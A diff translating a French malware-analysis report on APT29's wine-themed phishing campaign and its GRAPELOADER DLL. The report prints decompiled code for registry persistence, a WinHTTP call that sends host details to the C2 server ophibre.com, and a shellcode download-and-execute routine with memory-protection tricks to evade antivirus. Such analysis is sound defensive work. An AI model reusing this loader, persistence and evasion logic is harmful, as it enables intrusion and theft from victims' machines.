@@ -1,57 +1,58 @@
-# Rapport Wine -- APT29
+# Report on Wine -- APT29
 
-Dans ce rapport, je vais parler de la nouvelle version du maliciel utilisé par APT29, Wine.
+In this report, I will discuss the new version of the malware used by APT29, Wine.
 
-## Campagne d'hameçonnage
+## Phishing Campaign
 
-La campagne se déroule comme suit :
+The campaign unfolds as follows:
 
-- Envoi d'e-mails d'hameçonnage en empruntant l'identité de haut dignitaire européen (agence, institution, ministère, personne), ces e-mails contiennent un lien malveillant qui ressemble au lien du site du ministère/institution/agence qu'ils impersonnent, ce lien va :
-    - soit permettre de télécharger une archive contenant les exécutables et DLL malicieux
-    - soit directement télécharger un GRAPELOADER (chargeur de DLL d'APT29)
+- Phishing emails are sent while impersonating high-ranking European figures (agencies, institutions, ministries, or individuals). These emails contain a malicious link that closely resembles the official website URL of the entity being impersonated. This link either:
+    - allows the download of an archive containing malicious executables and DLLs, or  
+    - directly downloads **GRAPELOADER** (APT29's DLL loader).
 
-> Le corps de ce mail incite la victime à cliquer sur un lien en se faisant passer pour une invitation à une dégustation de vin (d'où le nom "Wine"), si elle souhaite recevoir plus d'informations. 
+> The body of the email encourages the victim to click on the link by pretending to be an invitation to a wine tasting event (hence the name "Wine"), should they wish to receive more information.
 
-- Téléchargement de l'archive ou du GRAPELOADER, contenant trois fichiers :
-    - `ppcore.dll` : DLL principale permettant de charger le WINELOADER qui va à son tour installer la backdoor et réaliser un ensemble de tests (anti-vm, anti-débogage, anti-analyse, etc)
-    - `AppvIsvSubsystems64.dll` : DLL contenant un ensemble d'opérations de déchiffrement et de chiffrement sans réelle importance (code superflu/code bloating), cependant ce code est nécessaire pour l'exécution de la suite du maliciel
-    - `wine.EXE` : exécutable permettant de charger les DLLS
+- Upon downloading the archive or GRAPELOADER, three files are included:
+    - `ppcore.dll`: The main DLL that loads **WINELOADER**, which in turn installs the backdoor and performs a series of checks (anti-VM, anti-debugging, anti-analysis, etc.).
+    - `AppvIsvSubsystems64.dll`: A DLL containing a set of encryption and decryption operations that serve no real purpose (superfluous code/code bloating), yet are necessary for the malware to function properly.
+    - `wine.EXE`: An executable responsible for loading the DLLs.
 
 
 ## wine.EXE
 
-Code offusqué qui va charger le *GRAPELOADER*.
+Obfuscated code that will load the *GRAPELOADER*.
 
 ## `ppcore.dll` / *GRAPELOADER* 
 
-CCœur du malware, le *GRAPELOADER* va servir à assurer sa persistance dans le système infecté et à charger le *WINELOADER*.
+Core of the malware, the *GRAPELOADER* is used to ensure persistence on the infected system and to load the *WINELOADER*.
 
-### Offuscation
+### Obfuscation
 
-Avant de décrire les tâches effectuées par ce code, il est important de parler de l'offuscation mise en place. Cette offuscation concerne les chaînes de caractères utilisées par le code pour charger tout un tas de fonctions de l'API Windows (ou d'autres librairies).
+Before describing the tasks performed by this code, it's important to discuss the obfuscation in place. This obfuscation targets the strings used by the code to load various Windows API functions (or other libraries).
 
-Cela donne lieu à 4 fonctions :
+This involves four functions:
 
-- `GetEncryptedDataOf` : Récupère des données chiffrées directement incluses dans le code du maliciel.
-- `GetDecrypted`/`DecryptData` : Déchiffre les données récupérées avec la fonction précédente.
-- `ResolveFunction` : Permet de résoudre une API à l'aide du nom de la librairie et du nom de la fonction.
-- `ErasePointerDestination` : Efface/Met à zéro l'endroit dans la mémoire pointée par le pointeur donné en paramètre.
+- `GetEncryptedDataOf`: Retrieves encrypted data directly embedded in the malware’s code.
+- `GetDecrypted` / `DecryptData`: Decrypts the data obtained with the previous function.
+- `ResolveFunction`: Resolves an API function using the library name and the function name.
+- `ErasePointerDestination`: Wipes/zeros out the memory area pointed to by the given pointer.
 
-Ces fonctions sont utilisées dans l'ordre donné ci-dessus, voici comment : 
+These functions are used in the order listed above, as follows:
 
-- Tout d'abord, à l'aide de `GetEncryptedDataOf`, le code récupère la chaîne de caractères chiffrée représentant le nom d'une fonction, d'une librairie (DLL) ou d'une chaîne de caractères classique (chemin, agent utilisateur, type de requête, ...) et la sauvegarde dans une variable. 
-- Ensuite, il utilise `GetDecrypted`/`DecryptData` pour déchiffrer la chaîne de caractères récupérée.
-- Résous l'API ciblée avec `ResolveFunction`, (nom de la librairie + nom de la fonction), puis appelle la fonction.
-- Enfin, le code va effacer la mémoire après l'utilisation de ces chaînes de caractères.
+- First, using `GetEncryptedDataOf`, the code retrieves an encrypted string representing a function name, library name (DLL), or standard string (e.g., path, user agent, request type, etc.), and stores it in a variable.
+- Then, it uses `GetDecrypted` / `DecryptData` to decrypt the retrieved string.
+- The targeted API is resolved with `ResolveFunction` (library name + function name), and then the function is called.
+- Finally, the code erases the memory after using these strings.
 
-Offuscation facile à contourner à l'aide de la trace, vu qu'il suffit de regarder le retour de la fonction `GetDecrypted`/`DecryptData` afin de comprendre ce qui a été retrouvé.
+This obfuscation is easy to bypass using execution tracing, since it's enough to inspect the return value of the `GetDecrypted` / `DecryptData` function to understand what was recovered.
 
-### Persistance
+### Persistence
 
-`ppcore.dll` va assurer la persistance au sein du système à l'aide de la fonction `InstallPersistenceRegKey`. Cette fonction va commencer par copier le contenu de l'archive dans un dossier créé au chemin suivant `C:\Users\User\AppData\Local\` :
+`ppcore.dll` ensures persistence within the system using the `InstallPersistenceRegKey` function. This function begins by copying the contents of the archive into a folder created at the following path: `C:\Users\User\AppData\Local\`
+
 
 ```c
-/* Création du dossier */
+/* Creation of the directory */
 void* name_CreateDirectoryW = GetDecryptedData(EncryptedNameOf_CreateDirectoryW);
 void var_5b1;
 void var_5b0;
@@ -64,10 +65,10 @@ ResolveFunction(name_kernel32, name_CreateDirectoryW, r8_8, r9_7)(&path, 0);
 ...
 
 /**
- * Copie des fichiers / Ce code se répète trois fois.
- * Une pour chaque fichier dans l'archive :
+ * File copying / This code is repeated three times.
+ * Once for each file in the archive:
  *  - ppcore.dll
- *  - AppvIsvSubSystems64dll
+ *  - AppvIsvSubSystems64.dll
  *  - wine.EXE
  */
 GetEncryptedDataOf_CopyFileW_2(&var_c09, &EncryptedNameOf_CopyFile);
@@ -83,7 +84,7 @@ int64_t r9_18;
 r8_28 = ResolveFunction(name_kernel32, name_CopyFileW, r8_27, r9_17)(&src, &dest, 0);
 ```
 
-Une fois ces fichiers copiés, le code va créer une clef de registre (RegKey) et lui attribuer le chemin vers `wine.EXE` afin qu'à chaque redémarrage, l'exécutable se lance. Voici le code :
+Once these files are copied, the code creates a registry key (RegKey) and assigns it the path to `wine.EXE` so that the executable runs at every system startup. Here is the code:
 
 ```c
 GetEncryptedDataOf_RegCreateKeyExW(&var_cc1, &EncryptedNameOf_RegCreateKeyExW);
@@ -132,19 +133,19 @@ void* name_POWERPNT = DecryptData_6(&var_dd8);
 RegSetValueExW(var_ca0, name_POWERPNT, 0, 1, &dest, path_wine_EXE * 2 + 2);
 ```
 
-Enfin, le code ferme l'accès à la RegKey.
+Finally, the code closes access to the RegKey.
 
-### Connexion au serveur et téléchargement du script
+### Server Connection and Script Download
 
-Pour l'instant, le code n'effectue aucune action malveillante. Néanmoins, après avoir installé la persistance, le code va essayer de se connecter à un serveur et de récupérer un script (ou exécutable, n'ayant pas accès au serveur, impossible de savoir).
+At this point, the code performs no malicious actions. However, after installing persistence, it attempts to connect to a server and retrieve a script (or executable — without access to the server, it is impossible to know).
 
-Tout d'abord, le code retrouve une chaîne d'agent utilisateur (*User Agent String*) chiffrée en mémoire qui est la suivante :
+First, the code obtains an encrypted user agent string in memory, which is as follows:
 
 `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36`
 
-Cette chaîne est utilisée afin de récupérer le handle de session pour ouvrir la connexion avec le serveur, il utilise `WinHttpOpen`.
+This string is used to get the session handle for opening the connection with the server, using `WinHttpOpen`.
 
-Ensuite, il récupère le nom du serveur qui est `ophibre.com` :
+Next, it retrieves the server name, which is `ophibre.com`:
 
 ```c
 GetEncryptedDataOf_ServerName(&var_1f1, &EncryptedNameOf_server);
@@ -153,7 +154,7 @@ int64_t r8_2;
 server_name = DecryptData_4(&EncryptedNameOf_server);
 ```
 
-Puis récupère le handle de la connexion au serveur en utilisant `WinHttpConnect` avec le handle de session, le nom du serveur et le port :
+Then it retrieves the handle for the connection to the server using `WinHttpConnect` with the session handle, the server name, and the port:
 
 ```c
 GetEncryptedDataOf_WinHttpConnect(&var_191, &var_190);
@@ -177,7 +178,7 @@ int64_t hConnect;
 int64_t r9_1;
 hConnect = WinHttpConnect(hSession, server_name, port, 0);
 ```
-Par la suite, il construit une requête `POST` qui a pour but de préparer le téléchargement du script (à voir) :
+Afterwards, it constructs a `POST` request intended to prepare for the download of the script (to be determined):
 
 ```c
 GetEncryptedDataOf_WinHttpOpenRequest(&var_221, &var_220);
@@ -203,7 +204,7 @@ int64_t r9_2;
 hRequest = WinHttpOpenRequest(hConnect, sub_7ffa1bc4ca70(&encrypted_POST), name_blogphp, 0, 0, 0, 0x800000);
 ```
 
-Il configure la requête HTTP pour ignorer les erreurs SSL/TLS :
+It configures the HTTP request to ignore SSL/TLS errors:
 
 ```c
 int32_t var_2a0 = 0x3300;
@@ -220,6 +221,8 @@ ResolveFunction(name_winhttp_4, name_WinHttpSetOption, r8_4, r9_2)(hRequest, 0x1
 ```
 Les flags sont les suivants :
 
+The flags are as follows:
+
 ```text
 0x3300 = 0x3000 | 0x0200 | 0x0100
        = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
@@ -227,7 +230,7 @@ Les flags sont les suivants :
          | SECURITY_FLAG_IGNORE_UNKNOWN_CA
 ```
 
-Ensuite, il envoie la requête avec `WinHttpSendRequest` avec des informations suplémentaires (nom de l'utilisateur, de la machine et du processus, et une chaîne de charactère hexadécimal, ainsi que d'autres choses que je n'ai pas trouvées) :
+Then, it sends the request using `WinHttpSendRequest` with additional information (user name, machine name, process name, a hexadecimal string, as well as other data that I have not identified):
 
 ```c
 GetEncryptedDataOf_WinHttpSendRequest(&var_319, &var_318);
@@ -242,7 +245,7 @@ int32_t var_818 = 0x648;
 int64_t success_request = ResolveFunction(name_winhttp_5, name_WinHttpSendRequest, r8_6, r9_3)(hRequest, 0, 0xffffffff, &data_7ffa1bc6ab40, 0x648, 0x648, 0);
 ```
 
-Puis, il réceptionne la réponse du serveur :
+Then, it receives the response from the server:
 
 ```c
 GetEncryptedDataOf_WinHttpReceiveResponse(&var_371, &var_370);
@@ -256,7 +259,7 @@ name_winhttp_6 = DecryptData_4(&var_3a0);
 int64_t get_response = ResolveFunction(name_winhttp_6, name_WinHttpReceiveResponse, r8_7, success_request)(hRequest, 0);
 ```
 
-De cette réponse, il récupère la taille de l'en-tête `Content-Length` (`0x20000005`), qui est la taille en octets du contenu renvoyé par le serveur :
+From this response, it retrieves the size of the `Content-Length` header (`0x20000005`), which represents the size in bytes of the content returned by the server:
 
 ```c
 GetEncryptedDataOf_WinHttpQueryHeaders(&var_3d1, &var_3d0);
@@ -271,9 +274,9 @@ var_818 = &var_3ac;
 int64_t query_success = ResolveFunction(name_winhttp_7, name_WinHttpQueryHeaders, r8_8, get_response)(hRequest, 0x20000005, 0, &size, var_818, 0);
 ```
 
-Si la taille des données récupérées est supérieure à 0, alors il rentre dans la condition dans laquelle le script va être téléchargé.
+If the size of the retrieved data is greater than 0, it enters the condition where the script will be downloaded.
 
-Pour récupérer le script, il réutilise `WinHttpQueryHeaders` mais cette fois pour récupérer le code de status HTTP, s'il est égal à `0xc8 == 200`, qui correspond à `OK`, alors le programme continue de s'exécuter :
+To retrieve the script, it uses `WinHttpQueryHeaders` again, but this time to get the HTTP status code. If it equals `0xc8 == 200` (which corresponds to `OK`), then the program continues executing:
 
 ```c
 GetEncryptedDataOf_WinHttpQueryHeaders_2(&var_431, &var_430);
@@ -289,7 +292,8 @@ var_818 = &var_40c;
 ResolveFunction(name_winhttp_8, name_WinHttpQueryHeaders_2, r8_9, query_success)(hRequest, 0x20000013, 0, &var_408, var_818, 0);
 ```
 
-S'il continue de s'exécuter, alors l'utilisation du script commence. Tout d'abord, il commence par allouer une zone mémoire en lecture/écriture de la taille récupérée dans le dernier `WinHttpQueryHeaders` :
+If it continues executing, the use of the script begins. First, it allocates a read/write memory region of the size retrieved in the last `WinHttpQueryHeaders` call:
+
 
 ```c
 GetEncryptedDataOf_VirtualAlloc(&var_481, &var_480);
@@ -307,7 +311,7 @@ int64_t r9_7;
 allocatedSpaceAddress = VirtualAlloc(0, (uint64_t)size, 0x3000, 4);
 ```
 
-Juste après, il lit le contenu de la réponse HTTP et le place dans la zone mémoire nouvellement allouée :
+Immediately after, it reads the content of the HTTP response and places it into the newly allocated memory region:
 
 ```c
 GetEncryptedDataOf_WinHttpReadData(&var_4d9, &var_4d8);
@@ -322,13 +326,13 @@ void* WinHttpReadData = ResolveFunction(name_winhttp_9, name_WinHttpReadData, r8
 int64_t r9_9 = WinHttpReadData(hRequest, *(uint64_t*)allocated_memory_space, (uint64_t)size, &var_4b8); 
 ```
 
-> On suppose que c'est le contenu de la réponse HTTP est un shellcode/script qui va permettre de charger la dernière DLL.
+> It is assumed that the content of the HTTP response is a shellcode/script that will load the final DLL.
 
-Après cela, la connexion avec le serveur est fermée à l'aide de `WinHttpCloseHandle`. Et le programme va lancer un nouveau thread dans lequel le script sera lancé.
+After that, the connection with the server is closed using `WinHttpCloseHandle`. The program then creates a new thread in which the script will be executed.
 
-### Exécution du script
+### Script Execution
 
-Avant de créer le thread, le programme va tout d'abord modifier les protections de l'espace mémoire où est le script :
+Before creating the thread, the program first changes the protections of the memory region where the script is located:
 
 ```c
 GetEncryptedDataOf_NtProtectVirtualMemory(&var_59, &var_58);
@@ -344,9 +348,9 @@ void var_34;
 ResolveFunction(name_ntdll, name_NtProtectVirtualMemory, r8_1, r9_1)(-1, &payload_base_address, &payload_size, 1, &var_34, var_350);
 ```
 
-Dans ce code, la protection va être mise à `PAGE_NOACCESS`, cela permet au maliciel d'éviter la détection par Windows Defender's (par exemple). La plupart des antivirus ne regardent pas les pages mémoires avec cette permission. 
+In this code, the protection is set to `PAGE_NOACCESS`, which allows the malware to avoid detection by Windows Defender (for example). Most antivirus software does not inspect memory pages with this permission.
 
-La création du thread se déroule comme suit :
+Thread creation proceeds as follows:
 
 ```c
 GetEncryptedDataOf_CreateThread(&var_a9, &var_a8);
@@ -364,13 +368,14 @@ void* var_358_1;
 int64_t hThread = CreateThread(0, 0, allocated_memory_space, 0, var_358_1, 0);
 ```
 
-Le thread est créé en mode suspendu avec `allocated_memory_space` pointant vers l'adresse du début de l'espace mémoire contenant le script.
+The thread is created in suspended mode with `allocated_memory_space` pointing to the start address of the memory region containing the script.
 
-Après cela, le programme fait appel, une première fois, à la fonction `Sleep` et cela pendant 10 secondes.
+Afterwards, the program calls the `Sleep` function for 10 seconds.
 
-> Cette fonctionnalité est possiblement utilisée pour contrer des analyses basés sur le temps (record de trace sur un certains temps).
+> This feature is possibly used to thwart time-based analysis (trace recording over a certain duration).
 
-Par la suite, la protection de la zone mémoire du script est changé en `PAGE_EXECUTE_READWRITE`
+Subsequently, the memory protection of the script region is changed to `PAGE_EXECUTE_READWRITE`.
+
 
 ```c
 GetEncryptedDataOf_NtProtectVirtualMemory_2(&var_149, &var_148);
@@ -384,9 +389,10 @@ name_ntdll_2 = GetDecrypted_ntdll(&var_170);
 ResolveFunction(name_ntdll_2, name_NtProtectVirtualMemory_2, r8_6,  r9_4)(-1, &payload_base_address, &payload_size, 0x40, &var_34);
 ```
 
-Suite à cela, le programme fait appel, une seconde fois, à la fonction `Sleep` et cela pendant 10 secondes.
+Following this, the program calls the `Sleep` function a second time, again for 10 seconds.
 
-Après cela, le programme fait appel à `ResumeThread` pour lancer le payload récupéré :
+Afterwards, the program calls `ResumeThread` to launch the retrieved payload:
+
 
 ```c
 GetEncryptedDataOf_ResumeThread(&var_1d9, &var_1d8);
@@ -405,19 +411,18 @@ ResolveFunction(name_kernel32_4, name_ResumeThread, r8_9, r9_6)(hThread);
 
 ---
 
-Comme énoncé plus tôt, le programme a écrit dans la zone mémoire alloué, où le thread est lancé, un payload qui va être lancé au moment où le thread reprend. Le payload est donc un shellcode qui va servir à chargé petit à petit ce qui est nécessaire pour la dernière DLL. 
+As stated earlier, the program writes a payload into the allocated memory region where the thread is launched. This payload is executed when the thread resumes. The payload is thus a shellcode that will progressively load what is needed for the final DLL.
 
-Le *Process Tree* donné par l'analyse montre qu'il y a 2 exécutable qui nous intéresse grandement :
+The *Process Tree* from the analysis shows two executables of particular interest:
 
-- `loaddll64.exe` : Exécutable qui va lancer `rundll32.exe`
-- `rundll32.exe` : Exécutable qui va charger/exécuter une DLL
+- `loaddll64.exe`: An executable that launches `rundll32.exe`
+- `rundll32.exe`: An executable that loads/executes a DLL
 
-
-On suppose que le shellcode qui va lancer la commande `loaddll64.exe "C:\Users\user\Desktop\vmtools.dll.dll"` a déjà en mémoire la DLL ainsi que `loaddll64.exe`. Ce shellcode va copier le contenu de `loaddll64.exe` et `vmtools.dll` sur le bureau. Ils vont par la suite être appelé par `loaddll64.exe` et donc `rundll32.exe`.
+It is assumed that the shellcode which launches the command `loaddll64.exe "C:\Users\user\Desktop\vmtools.dll.dll"` already has both the DLL and `loaddll64.exe` in memory. This shellcode copies the contents of `loaddll64.exe` and `vmtools.dll` onto the desktop. They will then be invoked by `loaddll64.exe` and consequently by `rundll32.exe`.
 
 
 ## `vmtools.dll` / *WINELOADER*
 
 *sha256 : adfe0ef4ef181c4b19437100153e9fe7aed119f5049e5489a36692757460b9f8*
 
-**PAS LE SCRIPT DONC PAS POSSIBLE DE SAVOIR QUE FAIT CETTE DLL**
+**NO SCRIPT AVAILABLE, SO IT IS IMPOSSIBLE TO KNOW WHAT EXACTLY THIS DLL DOES**
